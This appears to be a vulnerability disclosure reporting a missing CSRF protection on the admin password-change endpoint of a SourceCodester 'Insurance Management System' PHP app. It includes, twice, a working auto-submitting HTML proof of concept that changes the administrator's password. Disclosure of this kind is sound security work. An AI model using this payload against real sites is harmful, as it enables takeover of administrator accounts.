# Summary
There is a CSRF vulnerablity in `Insurance Management System` (https://www.sourcecodester.com/php/16995/insurance-management-system-php-mysql.html).
`/Script/admin/core/update_password`

This vulnerability allows attackers to use carefully constructed HTML pages to trick administrators into clicking and then modify the administrator's password.


# Details
In url `/Script/admin/core/update_password`, use burpsuite to intercept the traffic packet:
![image-20241019103858584](https://github.com/user-attachments/assets/3afa147b-d1ac-47d1-8d3f-9de7d53d9ff2)

It is easy to find that no protection for CSRF.

So we can use this PoC.html:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://e-insurance:82/Script/admin/core/update_password.php" method="POST">
      <input type="hidden" name="cpassword" value="12345678" />
      <input type="hidden" name="npassword" value="123qweQWE" />
      <input type="hidden" name="submit" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

Our initial password is 12345678. bp found that there is no CSRF protection at the password change point, so PoC.html can be generated to induce the administrator to click and change the password.

You can see that after clicking, the administrator password is changed from 12345678 to 123qweQWE.

![E-ins-CSRF-1.gif](https://github.com/N0zoM1z0/Vuln-Search/blob/main/E-ins-CSRF-1.gif)


# PoC
PoC.html:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://e-insurance:82/Script/admin/core/update_password.php" method="POST">
      <input type="hidden" name="cpassword" value="12345678" />
      <input type="hidden" name="npassword" value="123qweQWE" />
      <input type="hidden" name="submit" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![E-ins-CSRF-1.gif](https://github.com/N0zoM1z0/Vuln-Search/blob/main/E-ins-CSRF-1.gif)
